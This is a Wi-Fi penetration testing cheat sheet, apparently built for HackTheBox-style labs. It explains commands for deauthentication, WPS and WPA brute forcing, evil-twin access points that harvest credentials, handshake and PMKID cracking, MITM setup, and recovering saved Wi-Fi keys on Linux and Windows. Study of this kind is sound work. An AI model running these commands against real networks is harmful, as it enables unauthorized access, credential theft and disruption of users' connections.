# Wi-Fi Penetration Testing Tools and Techniques 

> ⚠️ **Legal / ethical notice:** All commands below are for **authorized labs and assessments only**. Do **not** attack networks you don’t own or have explicit written permission to test.

---

## 1. Reconnaissance

### 1.1 Interface & monitor-mode management

```bash
# List wireless interfaces, chipsets, drivers, and versions
sudo airmon-ng
```

**What it does:**  
Lists Wi-Fi interfaces and related driver/chipset details.

**Command breakdown:**

- `sudo` – run with root privileges.
- `airmon-ng` – Aircrack-ng helper for managing wireless interfaces and monitor mode.

```bash
# Enable monitor mode on wlan0
sudo airmon-ng start wlan0
```

**What it does:**  
Puts `wlan0` into monitor mode (often creating `wlan0mon`).

**Command breakdown:**

- `sudo` – run as root.
- `airmon-ng` – monitor-mode helper.
- `start` – action to enable monitor mode.
- `wlan0` – target wireless interface.

```bash
# Disable monitor mode on wlan0mon
sudo airmon-ng stop wlan0mon
```

**What it does:**  
Takes `wlan0mon` out of monitor mode and returns it to normal (managed) mode.

**Command breakdown:**

- `sudo` – run as root.
- `airmon-ng` – monitor-mode helper.
- `stop` – action to disable monitor mode.
- `wlan0mon` – monitor-mode interface to stop.

```bash
# Bring wlan0 interface down
sudo ifconfig wlan0 down
```

**What it does:**  
Temporarily disables the `wlan0` interface.

**Command breakdown:**

- `sudo` – root privileges.
- `ifconfig` – tool to configure network interfaces.
- `wlan0` – interface to modify.
- `down` – set link state to “down” (disabled).

```bash
# Set wlan0 into monitor mode using iw
sudo iw dev wlan0 set monitor none
```

**What it does:**  
Enables monitor mode directly with `iw` on `wlan0`.

**Command breakdown:**

- `sudo` – run as root.
- `iw` – modern wireless configuration tool.
- `dev wlan0` – operate on device `wlan0`.
- `set monitor` – set mode to **monitor**.
- `none` – no extra flags (e.g., control, other options disabled).

```bash
# Bring wlan0 interface back up
sudo ifconfig wlan0 up
```

**What it does:**  
Re-enables `wlan0` after configuration changes.

**Command breakdown:**

- `sudo` – root privileges.
- `ifconfig` – interface configuration tool.
- `wlan0` – interface name.
- `up` – bring the interface online.

```bash
# Switch wlan0 back to managed mode
sudo iw dev wlan0 set type managed
```

**What it does:**  
Returns the interface from monitor mode to regular **managed** mode.

**Command breakdown:**

- `sudo` – root privileges.
- `iw` – wireless configuration tool.
- `dev wlan0` – operate on `wlan0`.
- `set type managed` – set interface type to “managed” (normal client mode).

```bash
# Test if wlan0mon supports packet injection
sudo aireplay-ng --test wlan0mon
```

**What it does:**  
Sends test frames to check if packet injection works on `wlan0mon`.

**Command breakdown:**

- `sudo` – root permissions.
- `aireplay-ng` – packet injection / replay tool.
- `--test` – run built-in injection test routine.
- `wlan0mon` – monitor-mode interface to test.

```bash
# Send 10 deauthentication frames to a client on an AP
sudo aireplay-ng --deauth 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
```

**What it does:**  
Performs a targeted deauthentication attack against one client on a specific AP.

**Command breakdown:**

- `sudo` – run with root privileges.
- `aireplay-ng` – frame injection tool.
- `--deauth 10` – send 10 deauth frames.
- `-a <AP_MAC>` – BSSID (MAC) of the access point.
- `-c <CLIENT_MAC>` – MAC address of the client station.
- `wlan0mon` – monitor-mode interface used to inject frames.

```bash
# Set wlan0 to use Wi-Fi channel 1
sudo iw dev wlan0 set channel 1
```

**What it does:**  
Forces `wlan0` onto **channel 1**.

**Command breakdown:**

- `sudo` – root privileges.
- `iw` – wireless configuration tool.
- `dev wlan0` – operate on `wlan0`.
- `set channel 1` – tune radio to channel 1 (2412 MHz in 2.4 GHz band).

---

### 1.2 Airodump-ng scanning

```bash
# Scan all channels and list detected networks and clients
sudo airodump-ng wlan0mon
```

**What it does:**  
Performs a channel-hopping scan showing APs and clients.

**Command breakdown:**

- `sudo` – root privileges.
- `airodump-ng` – 802.11 capture / scanner.
- `wlan0mon` – monitor-mode interface used for capture.

```bash
# Scan a specific BSSID on channel 1 with wlan0mon
sudo airodump-ng --bssid D8:D3:2D:EB:29:D6 -c 1 wlan0mon
```

**What it does:**  
Locks to a single AP and channel to capture focused traffic.

**Command breakdown:**

- `sudo` – run as root.
- `airodump-ng` – capture/scanner.
- `--bssid D8:D3:2D:EB:29:D6` – target AP BSSID.
- `-c 1` – limit capture to channel 1.
- `wlan0mon` – monitor-mode interface.

```bash
# Scan and show manufacturer and WPS information
sudo airodump-ng --wps --manufacturer wlan0mon
```

**What it does:**  
Scans and adds extra columns for WPS details and device manufacturer.

**Command breakdown:**

- `sudo` – root privileges.
- `airodump-ng` – scanner.
- `--wps` – enable WPS info detection.
- `--manufacturer` – show vendor/manufacturer information.
- `wlan0mon` – capture interface.

---

### 1.3 GPSD + virtual GPS + Kismet

```bash
# Stop all GPSD-related systemd units
sudo systemctl stop gpsd
sudo systemctl stop gpsd.socket
sudo systemctl stop system-gpsdctl.slice
```

**What it does:**  
Stops GPSD services so other tools (like Kismet) can own the GPS device.

**Command breakdown:**

- `sudo` – run each command with root privileges.
- `systemctl` – control systemd services.
- `stop gpsd` – stop `gpsd` main service.
- `stop gpsd.socket` – stop the socket unit that auto-spawns gpsd.
- `stop system-gpsdctl.slice` – stop the associated slice/management unit.

```bash
# Start GPSD bound to a physical USB GPS receiver
sudo gpsd /dev/ttyUSB0
```

**What it does:**  
Launches `gpsd` attached to `/dev/ttyUSB0`.

**Command breakdown:**

- `sudo` – run as root.
- `gpsd` – GPS daemon.
- `/dev/ttyUSB0` – serial device representing the USB GPS.

```bash
# Display real-time GPS data
gpsmon
```

**What it does:**  
Opens a ncurses interface showing live GPS output.

**Command breakdown:**

- `gpsmon` – terminal monitor for `gpsd` data; no extra arguments uses defaults.

```bash
# Create two linked pseudo-terminals for virtual GPS piping
socat -d -d pty,raw,echo=0 pty,raw,echo=0
```

**What it does:**  
Uses `socat` to create two linked PTYs (pseudo-TTYs) to simulate/carry GPS data.

**Command breakdown:**

- `socat` – stream redirection/relay tool.
- `-d -d` – print extra diagnostic/debug info twice (more verbosity).
- `pty,raw,echo=0` – create first PTY in raw mode without echo.
- second `pty,raw,echo=0` – create second PTY linked to the first.

```bash
# Start GPSD on a virtual pseudo-terminal (e.g., /dev/pts/6)
sudo gpsd /dev/pts/6
```

**What it does:**  
Binds gpsd to a virtual PTY created by `socat`.

**Command breakdown:**

- `sudo` – root privileges.
- `gpsd` – GPS daemon.
- `/dev/pts/6` – PTY device used as GPS data source.    

```bash
# Configure GPSD to always use /dev/pts/6 in its default config
sudo sed -i 's/DEVICES="\/dev\/pts\/[0-9]*"/DEVICES="\/dev\/pts\/6"/' /etc/default/gpsd
```

**What it does:**  
Edits gpsd’s config so `DEVICES` points to `/dev/pts/6`.

**Command breakdown:**

- `sudo` – run as root (needed to edit `/etc`).
- `sed` – stream editor.
- `-i` – edit file **in place**.
- `s/.../.../` – substitution pattern.
    - `DEVICES="\/dev\/pts\/[0-9]*"` – original value matching any `/dev/pts/N`.
    - `DEVICES="\/dev\/pts\/6"` – new fixed device value.
- `/etc/default/gpsd` – gpsd default configuration file being altered.

```bash
# Show GPS data from the specific virtual device
sudo gpsmon /dev/pts/6
```

**What it does:**  
Monitors GPS output over the configured virtual PTY.

**Command breakdown:**

- `sudo` – optional root use (depends on permissions).
- `gpsmon` – monitor tool.
- `/dev/pts/6` – explicit device to monitor from gpsd.

```bash
# Launch Kismet WebUI and capture using wlan0mon
sudo kismet -c wlan0mon
```

**What it does:**  
Starts Kismet, capturing from `wlan0mon` and exposing the web UI.

**Command breakdown:**

- `sudo` – run as root.
- `kismet` – wireless IDS/scanner.
- `-c wlan0mon` – capture source: `wlan0mon` monitor interface.

```bash
# Show statistics from a specific Kismet session log
sudo kismetdb_statistics --in Kismet-yyyymmdd-xx-xx-xx-1.kismet
```

**What it does:**  
Generates statistics from a Kismet database/log file.

**Command breakdown:**

- `sudo` – run with root (or user permissions that can read the DB).
- `kismetdb_statistics` – Kismet DB statistics tool.
- `--in Kismet-yyyymmdd-xx-xx-xx-1.kismet` – input Kismet log/database file.

```bash
# Dump all detected devices from a Kismet log to JSON
sudo kismetdb_dump_devices --ekjson --in Kismet-yyyymmdd-xx-xx-xx-1.kismet --out alldevices.json
```

**What it does:**  
Exports device information from a Kismet DB to a JSON file.

**Command breakdown:**

- `sudo` – root permissions.
- `kismetdb_dump_devices` – device export tool.
- `--ekjson` – export in **extended JSON** format.
- `--in Kismet-...` – specify Kismet database input file.
- `--out alldevices.json` – path/name of JSON output file.

```bash
# Convert a Kismet log to a KML file for mapping
sudo kismetdb_to_kml --in Kismet-yyyymmdd-xx-xx-xx-1.kismet --out geo.kml
```

**What it does:**  
Creates a KML for visualizing AP locations in mapping tools like Google Earth.

**Command breakdown:**

- `sudo` – run with required permissions.
- `kismetdb_to_kml` – conversion utility.
- `--in Kismet-...` – Kismet DB input.
- `--out geo.kml` – KML file output path.

---

### 1.4 Managing Airodump captures & wifi_db

```bash
# Capture and save scan results to the scan-folder directory with prefix "scan"
airodump-ng wlan0mon -w scan-folder/scan
```

**What it does:**  
Runs `airodump-ng` and writes output files (cap, csv, etc.) into `scan-folder`.

**Command breakdown:**

- `airodump-ng` – wireless scanner.
- `wlan0mon` – capture interface.
- `-w scan-folder/scan` – write files with prefix `scan` in `scan-folder`.

```bash
# Parse only the scan-01.* files from a directory with wifi_db
python3 wifi_db.py scan-folder/scan-01
```

**What it does:**  
Processes a specific scan set (`scan-01.*`) into a structured format.

**Command breakdown:**

- `python3` – Python 3 interpreter.
- `wifi_db.py` – script that parses airodump logs.
- `scan-folder/scan-01` – base name of scan files (`.cap`, `.csv`, etc.) to parse.

```bash
# Parse all scan files in a directory and output to an SQLite database
python3 wifi_db.py -d database.sqlite scan-folder
```

**What it does:**  
Creates `database.sqlite` containing parsed data from all scan files in `scan-folder`.

**Command breakdown:**

- `python3` – Python 3 interpreter.
- `wifi_db.py` – parsing script.
- `-d database.sqlite` – name of resulting SQLite DB.
- `scan-folder` – directory containing scan files to parse.

---

## 2. Online Bruteforce

```bash
# WPA2-Enterprise online bruteforce against a single user with a wordlist
python2 air-hammer.py -i wlan1 -e HTB-Corp -p /opt/rockyou.txt -u user.txt
```

**What it does:**  
Attempts WPA2-Enterprise authentication for one user using many passwords.

**Command breakdown:**

- `python2` – Python 2 interpreter.
- `air-hammer.py` – WPA2-Enterprise attack tool.
- `-i wlan1` – interface used to connect/attack.
- `-e HTB-Corp` – enterprise SSID (EAP network).
- `-p /opt/rockyou.txt` – password wordlist file.
- `-u user.txt` – file containing the username (or credentials) to attack.

```bash
# WPA2-Enterprise password spraying with a single password against many usernames
python2 air-hammer.py -i wlan1 -e HTB-Corp -P 123456789 -u usernames.txt
```

**What it does:**  
Sprays one password (`123456789`) against a list of usernames.

**Command breakdown:**

- `python2` – Python 2 interpreter.
- `air-hammer.py` – attack script.
- `-i wlan1` – attacking interface.
- `-e HTB-Corp` – target EAP SSID.
- `-P 123456789` – **single password** to test.
- `-u usernames.txt` – file with many usernames.

```bash
# Resume a previous air-hammer session starting from line 5 of usernames.txt
python2 air-hammer.py -i wlan1 -e HTB-Corp -P 123456789 -u usernames.txt -s 5
```

**What it does:**  
Resumes a password spray/bruteforce starting at a specific offset.

**Command breakdown:**

- Same options as previous command.
- `-s 5` – start from **line 5** in the usernames file (resume point).

```bash
# Perform a full WPS PIN bruteforce attack
reaver -i mon0 -b AE:EB:B0:11:A0:1E -c 1
```

**What it does:**  
Launches a WPS PIN attack against the target AP.

**Command breakdown:**

- `reaver` – WPS attack tool.
- `-i mon0` – monitor-mode interface.
- `-b AE:EB:B0:11:A0:1E` – BSSID of AP with WPS enabled.
- `-c 1` – Wi-Fi channel 1.

```bash
# Perform a partial WPS PIN bruteforce with a known prefix
reaver -i mon0 -b B2:A5:1D:E1:B2:11 -c 1 -p 1234
```

**What it does:**  
Uses `1234` as a partial or full WPS PIN during attack.

**Command breakdown:**

- `reaver` – WPS attack tool.
- `-i mon0` – interface in monitor mode.
- `-b B2:A5:1D:E1:B2:11` – target AP BSSID.
- `-c 1` – channel 1.
- `-p 1234` – specify WPS PIN (or prefix) to test.

```bash
# Launch a WPS Null PIN attack using a blank PIN
reaver -b 5A:1A:59:B7:E7:97 -c 1 -i mon0 -p " "
```

**What it does:**  
Attempts to exploit APs that treat an empty PIN as valid.

**Command breakdown:**

- `reaver` – WPS attack tool.
- `-b 5A:1A:59:B7:E7:97` – BSSID of AP.
- `-c 1` – channel 1.
- `-i mon0` – monitor-mode interface.
- `-p " "` – blank/space PIN value.

```bash
# Perform WPA/WPA2-PSK online bruteforce against an AP
python3 WifiBF.py -s HackTheBox-PSK -w words.txt
```

**What it does:**  
Tries passphrases from `words.txt` against SSID `HackTheBox-PSK`.

**Command breakdown:**

- `python3` – Python 3 interpreter.
- `WifiBF.py` – online bruteforce script.
- `-s HackTheBox-PSK` – target SSID name.
- `-w words.txt` – wordlist of candidate passwords.

```bash
# WPA3-SAE online bruteforce with Wacker
python3 wacker.py --interface wlan1 --wordlist rockyou.txt --ssid <SSID> --freq 2412 --bssid <MAC>
```

**What it does:**  
Performs online WPA3-SAE password guessing against a specific AP.

**Command breakdown:**

- `python3` – Python 3 interpreter.
- `wacker.py` – WPA3 SAE attack tool.
- `--interface wlan1` – interface to send authentication attempts.
- `--wordlist rockyou.txt` – password list.
- `--ssid <SSID>` – target SSID.
- `--freq 2412` – frequency in MHz (channel 1).
- `--bssid <MAC>` – AP’s BSSID.

```bash
# Split a wordlist into four equal segments
bash split.sh 4 rockyou.txt
```

**What it does:**  
Splits `rockyou.txt` into 4 smaller files for distributed attacks.

**Command breakdown:**

- `bash` – shell used to run script.
- `split.sh` – splitting script.
- `4` – number of pieces to create.
- `rockyou.txt` – input wordlist.

---

## 3. Evil Twin + Captive Portal

```bash
# Launch a rogue WPA-PSK access point with eaphammer
./eaphammer -i wlan1 --channel 1 --auth wpa-psk --essid HTB-WPA
```

**What it does:**  
Creates a rogue AP using WPA-PSK on channel 1 with SSID `HTB-WPA`.

**Command breakdown:**

- `./eaphammer` – run local `eaphammer` binary.
- `-i wlan1` – interface used as AP.
- `--channel 1` – RF channel 1.
- `--auth wpa-psk` – use WPA-PSK auth.
- `--essid HTB-WPA` – broadcast SSID `HTB-WPA`.

```bash
# Launch a rogue WPA-PSK AP with an integrated captive portal
./eaphammer -i wlan0 --channel 1 --auth wpa-psk --essid HTB-WPA --captive-portal --lhost 192.168.1.1
```

**What it does:**  
Creates a fake AP plus captive portal hosted at `192.168.1.1`.

**Command breakdown:**

- `./eaphammer` – attack framework.
- `-i wlan0` – AP interface.
- `--channel 1` – channel.
- `--auth wpa-psk` – WPA-PSK.
- `--essid HTB-WPA` – SSID.
- `--captive-portal` – enable captive portal module.
- `--lhost 192.168.1.1` – local IP where portal web server listens.

```bash
# Launch an OWE-based captive portal AP
./eaphammer -i wlan0 --auth owe --essid HTB-OWE --captive-portal
```

**What it does:**  
Creates an opportunistic wireless encryption (OWE) AP with a captive portal.

**Command breakdown:**

- `./eaphammer` – tool.
- `-i wlan0` – AP interface.
- `--auth owe` – use OWE authentication.
- `--essid HTB-OWE` – SSID `HTB-OWE`.
- `--captive-portal` – enable captive portal.

```bash
# Start the certificate creation wizard for eaphammer rogue APs
./eaphammer --cert-wizard
```

**What it does:**  
Guides you through generating CA/server certificates for enterprise/HTTPS APs.

**Command breakdown:**

- `./eaphammer` – program.
- `--cert-wizard` – interactive certificate wizard mode.

```bash
# Launch an enterprise WPA-EAP rogue AP that captures credentials
./eaphammer --interface wlan1 --auth wpa-eap --essid HTB-Corp --creds
```

**What it does:**  
Creates a WPA-EAP (Enterprise) rogue AP to harvest user credentials.

**Command breakdown:**

- `./eaphammer` – attack tool.
- `--interface wlan1` – AP interface.
- `--auth wpa-eap` – WPA-Enterprise (802.1X).
- `--essid HTB-Corp` – SSID `HTB-Corp`.
- `--creds` – capture credentials supplied by clients.

```bash
# Launch the Airgeddon framework with preserved environment variables
sudo -E /opt/airgeddon/airgeddon.sh
```

**What it does:**  
Starts Airgeddon, a Wi-Fi attack toolkit with captive portal features.

**Command breakdown:**

- `sudo` – run as root.
- `-E` – preserve user environment variables.
- `/opt/airgeddon/airgeddon.sh` – path to Airgeddon launcher script.

```bash
# Replace Airgeddon's default captive portal template with a custom one
sudo cp /home/wifi/custom-captive-portal/Regular/* /tmp/ag1/www/
```

**What it does:**  
Copies custom portal files into Airgeddon’s web directory.

**Command breakdown:**

- `sudo` – root privileges.
- `cp` – copy files.
- `/home/wifi/custom-captive-portal/Regular/*` – source files (custom portal).
- `/tmp/ag1/www/` – Airgeddon captive portal webroot.

```bash
# Launch WifiPumpkin3 (two equivalent ways)
sudo wifipumpkin3
sudo wp3
```

**What it does:**  
Starts WifiPumpkin3 rogue AP / MITM framework.

**Command breakdown:**

- `sudo` – run with root privileges.
- `wifipumpkin3` – full command name.
- `wp3` – shorthand wrapper for the same tool (second line).

---

## 4. Password Cracking

### 4.1 Aircrack-ng basics & sessions

```bash
# Benchmark CPU performance for Aircrack-ng
aircrack-ng -S
```

**What it does:**  
Runs an internal speed benchmark for Aircrack-ng.

**Command breakdown:**

- `aircrack-ng` – Wi-Fi key cracker.
- `-S` – benchmark/summary performance test.

```bash
# Crack WEP using the PTW method
aircrack-ng -b D2:13:94:21:7F:1A HTB.ivs
```

**What it does:**  
Attempts to recover a WEP key using the PTW method from `.ivs` file.

**Command breakdown:**

- `aircrack-ng` – cracking tool.
- `-b D2:13:94:21:7F:1A` – target BSSID of AP.
- `HTB.ivs` – IVS capture file with WEP packets.

```bash
# Crack WEP using Korek attacks
aircrack-ng -K HTB.ivs
```

**What it does:**  
Uses Korek attacks to crack WEP from an IVS file.

**Command breakdown:**

- `aircrack-ng` – cracker.
- `-K` – enable Korek attacks.
- `HTB.ivs` – IVS capture file.

```bash
# Crack WPA/WPA2-PSK with a wordlist
aircrack-ng -w /opt/wordlist.txt HTB.pcap
```

**What it does:**  
Tries passwords from `wordlist.txt` against a capture containing a WPA handshake.

**Command breakdown:**

- `aircrack-ng` – cracker.
- `-w /opt/wordlist.txt` – wordlist file.
- `HTB.pcap` – capture containing handshake.

```bash
# Create a crack session and use two wordlists
aircrack-ng --new-session current.session -w /opt/wordlist.txt,rockyou.txt HTB.cap
```

**What it does:**  
Starts a named cracking session using multiple wordlists, allowing later resume.

**Command breakdown:**

- `aircrack-ng` – cracker.
- `--new-session current.session` – create a session named `current.session`.
- `-w /opt/wordlist.txt,rockyou.txt` – use both wordlists in sequence.
- `HTB.cap` – capture with handshake.

```bash
# Restore a previously saved Aircrack-ng session
aircrack-ng --restore-session current.session
```

**What it does:**  
Resumes cracking from where `current.session` left off.

**Command breakdown:**

- `aircrack-ng` – cracker.
- `--restore-session current.session` – load and continue previous session.    

---

### 4.2 Cowpatty & genpmk (rainbow tables)

```bash
# Check if a capture file contains a valid WPA 4-way handshake
cowpatty -c -r WPA-01.cap
```

**What it does:**  
Validates that a proper handshake exists in `WPA-01.cap`.

**Command breakdown:**

- `cowpatty` – WPA/WPA2 PSK cracker.
- `-c` – check only (no cracking).
- `-r WPA-01.cap` – capture file to inspect.

```bash
# Crack a WPA handshake using a dictionary file
cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s HackTheBox
```

**What it does:**  
Attempts to recover WPA PSK with a dictionary attack.

**Command breakdown:**

- `cowpatty` – cracker.
- `-r WPA-01.cap` – input capture with handshake.
- `-f /opt/wordlist.txt` – password wordlist file.
- `-s HackTheBox` – SSID of the target network.

```bash
# Generate a WPA/WPA2 rainbow table (PMK hashes) for a specific SSID
genpmk -f /opt/rockyou.txt -d /tmp/hashtable -s HackTheBox
```

**What it does:**  
Precomputes PMKs for all passwords in `rockyou.txt` for SSID `HackTheBox`.

**Command breakdown:**

- `genpmk` – PMK precomputation tool.
- `-f /opt/rockyou.txt` – input wordlist.
- `-d /tmp/hashtable` – output hash table file.
- `-s HackTheBox` – SSID these hashes apply to.

```bash
# Crack a WPA handshake using a precomputed rainbow table
cowpatty -d /tmp/hashtable -r WPA-01.cap -s HackTheBox
```

**What it does:**  
Uses the precomputed hash table to quickly test the handshake.

**Command breakdown:**

- `cowpatty` – cracker.
- `-d /tmp/hashtable` – precomputed PMK hash table.
- `-r WPA-01.cap` – capture file.
- `-s HackTheBox` – SSID used during precomputation.

---

### 4.3 Pyrit workflow

```bash
# List available CPU cores detected by Pyrit
pyrit list_cores
```

**What it does:**  
Shows CPU (and possibly GPU) cores Pyrit can use.

**Command breakdown:**

- `pyrit` – WPA/WPA2 cracker with precomputation support.
- `list_cores` – subcommand to enumerate cores.

```bash
# Benchmark Pyrit performance
pyrit benchmark
```

**What it does:**  
Runs performance tests for the configured cores.

**Command breakdown:**

- `pyrit` – tool.
- `benchmark` – subcommand to measure speed.

```bash
# Extract only handshakes from a capture file into a new PCAP
pyrit -r capture.pcap -o handshakes.pcap strip
```

**What it does:**  
Parses `capture.pcap` and saves just handshake packets into `handshakes.pcap`.

**Command breakdown:**

- `pyrit` – tool.
- `-r capture.pcap` – input capture.
- `-o handshakes.pcap` – output capture containing only handshakes.
- `strip` – operation to remove non-handshake data.

```bash
# Analyze the extracted handshake capture
pyrit -r handshakes.pcap analyze
```

**What it does:**  
Checks the quality/completeness of handshakes.

**Command breakdown:**

- `pyrit` – tool.
- `-r handshakes.pcap` – input file to analyze.
- `analyze` – analysis subcommand.

```bash
# Perform direct WPA/WPA2-PSK bruteforce using a wordlist
pyrit -r handshakes.pcap -e '<ESSID>' -i /opt/wordlist.txt attack_passthrough
```

**What it does:**  
Uses a wordlist to test passwords against captured handshakes.

**Command breakdown:**

- `pyrit` – cracking tool.
- `-r handshakes.pcap` – handshake capture.
- `-e '<ESSID>'` – target ESSID (SSID name).
- `-i /opt/wordlist.txt` – wordlist file.
- `attack_passthrough` – mode that attacks directly from capture.

```bash
# Add a target ESSID for later precomputation
pyrit -e '<ESSID>' create_essid
```

**What it does:**  
Registers an SSID in Pyrit’s database to precompute PMKs.

**Command breakdown:**

- `pyrit` – tool.
- `-e '<ESSID>'` – ESSID to add.
- `create_essid` – create SSID entry in database.

```bash
# Import candidate passwords into Pyrit's database
pyrit -i /opt/wordlist.txt import_passwords
```

**What it does:**  
Loads candidate passwords into Pyrit for PMK precomputation.

**Command breakdown:**

- `pyrit` – tool.
- `-i /opt/wordlist.txt` – wordlist to import.
- `import_passwords` – import operation.

```bash
# Precompute PMK hashes for all ESSIDs and passwords in the database
pyrit batch
```

**What it does:**  
Runs batch precomputation to build a PMK database.

**Command breakdown:**

- `pyrit` – tool.
- `batch` – process all queued ESSID/password combinations.

```bash
# Use a precomputed PMK hash database to bruteforce WPA/WPA2-PSK
pyrit -r HTB-01.cap -e 'HackTheBox-WCD' attack_db
```

**What it does:**  
Attacks the capture using precomputed PMK entries.

**Command breakdown:**

- `pyrit` – tool.
- `-r HTB-01.cap` – capture to attack.
- `-e 'HackTheBox-WCD'` – ESSID.
- `attack_db` – use database mode (precomputed PMKs).

---

### 4.4 PMKID attacks

```bash
# Capture PMKID values from an AP using wlan0
python3 capture_pmkid.py wlan0 "<ESSID>"
```

**What it does:**  
Initiates connections to grab PMKID hashes from the AP.

**Command breakdown:**

- `python3` – Python 3 interpreter.
- `capture_pmkid.py` – PMKID capture script.
- `wlan0` – interface used.
- `"<ESSID>"` – target SSID.

```bash
# Crack a captured PMKID value with a wordlist
python3 pmkidcracker.py -s "<SSID>" -ap "<AP_MAC>" -c "<CLIENT_MAC>" -p "<PMKID_VALUE>" -w "/opt/wordlist.txt" -t 50
```

**What it does:**  
Tests passwords from `wordlist.txt` to find one matching the PMKID.

**Command breakdown:**

- `python3` – Python 3 interpreter.
- `pmkidcracker.py` – cracking script.
- `-s "<SSID>"` – network SSID.
- `-ap "<AP_MAC>"` – AP’s MAC address.
- `-c "<CLIENT_MAC>"` – client MAC used in PMKID.
- `-p "<PMKID_VALUE>"` – PMKID hash.
- `-w "/opt/wordlist.txt"` – wordlist file path.
- `-t 50` – thread count / concurrency level.

```bash
# Crack PMKID hashes with hashcat (hash mode 22000)
hashcat -m 22000 pmkid.capture /opt/rockyou.txt
```

**What it does:**  
Uses hashcat to recover the passphrase from a PMKID hash list.

**Command breakdown:**

- `hashcat` – GPU password cracker.
- `-m 22000` – hash mode for WPA-PBKDF2 PMKID/EAPOL (new format).
- `pmkid.capture` – file containing PMKID hashes.
- `/opt/rockyou.txt` – wordlist.

---

## 5. MITM + Miscellaneous

```bash
# Enable IPv4 packet forwarding on Linux
sudo sysctl -w net.ipv4.ip_forward=1
```

**What it does:**  
Allows the kernel to forward packets between interfaces (needed for routing/MITM).

**Command breakdown:**

- `sudo` – run as root.
- `sysctl` – runtime kernel parameter tool.
- `-w` – write a value.
- `net.ipv4.ip_forward=1` – set IP forwarding flag to 1 (enabled).

```bash
# Enable and start the Apache HTTP server
sudo systemctl enable apache2
sudo systemctl start apache2
```

**What it does:**  
Configures Apache to start at boot and starts it immediately.

**Command breakdown:**

- `sudo` – run commands as root.
- `systemctl enable apache2` – enable Apache service at boot.
- `systemctl start apache2` – start Apache now.

```bash
# Launch Bettercap on wlan0 for network MITM/monitoring
sudo bettercap -iface wlan0
```

**What it does:**  
Starts Bettercap using `wlan0` as the active network interface.

**Command breakdown:**

- `sudo` – run as root.
- `bettercap` – powerful MITM/monitoring framework.
- `-iface wlan0` – interface to bind to.

```bash
# View the ARP table
arp -a
```

**What it does:**  
Shows current ARP cache entries (IP to MAC mappings).

**Command breakdown:**

- `arp` – ARP cache inspection tool.
- `-a` – display all entries.

```bash
# Show the default gateway route
ip route show | grep "default via"
```

**What it does:**  
Displays the default route and gateway IP.

**Command breakdown:**

- `ip route show` – list routing table.
- `|` – pipe output to next command.
- `grep "default via"` – filter lines containing the default route.

```bash
# Display the routing table in numeric form
route -n
```

**What it does:**  
Shows routes with numeric addresses (no DNS lookups).

**Command breakdown:**

- `route` – legacy routing tool.
- `-n` – don’t resolve hostnames; show raw IPs.

```bash
# Launch the RouterSploit framework
python3 /opt/routersploit/rsf.py
```

**What it does:**  
Starts RouterSploit for testing router/IoT device vulnerabilities.

**Command breakdown:**

- `python3` – Python 3 interpreter.
- `/opt/routersploit/rsf.py` – main RouterSploit script.

```bash
# View stored Wi-Fi connection configuration for a specific SSID on Linux
cat /etc/NetworkManager/system-connections/<SSID>
```

**What it does:**  
Displays NetworkManager profile file, often including saved Wi-Fi credentials.

**Command breakdown:**

- `cat` – print file contents.
- `/etc/NetworkManager/system-connections/<SSID>` – configuration file for SSID profile.

```powershell
# List saved Wi-Fi interfaces/profiles directory on Windows
dir C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces
```

**What it does:**  
Shows the directories for each wireless interface’s stored profiles.

**Command breakdown:**

- `dir` – list directory contents (cmd/PowerShell).
- `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces` – path to Wi-Fi profiles.

```powershell
# List saved Wi-Fi profiles for a specific interface (GUID) on Windows
dir C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}
```

**What it does:**  
Lists profile XML files for a specific interface GUID.

**Command breakdown:**

- `dir` – list files.
- `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}` – specific interface folder.

```powershell
# Read a saved Wi-Fi profile file to recover credentials on Windows
type C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}
```

**What it does:**  
Prints the contents of a stored Wi-Fi profile (XML), where keys may appear.

**Command breakdown:**

- `type` – output contents of file(s).
- `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}` – profile file path (include filename if needed).

```powershell
# List all saved Wi-Fi profiles on Windows
netsh wlan show profile
```

**What it does:**  
Shows all stored WLAN profiles on the system.

**Command breakdown:**

- `netsh` – Windows network shell.
- `wlan` – WLAN context.
- `show profile` – list profiles.

```powershell
# Show stored credentials for a specific Wi-Fi profile in cleartext on Windows
netsh wlan show profile HTB-Internal key=clear
```

**What it does:**  
Displays configuration and plaintext key for the `HTB-Internal` profile.

**Command breakdown:**

- `netsh` – network shell.
- `wlan` – WLAN context.
- `show profile HTB-Internal` – display that profile.
- `key=clear` – show key material in clear text.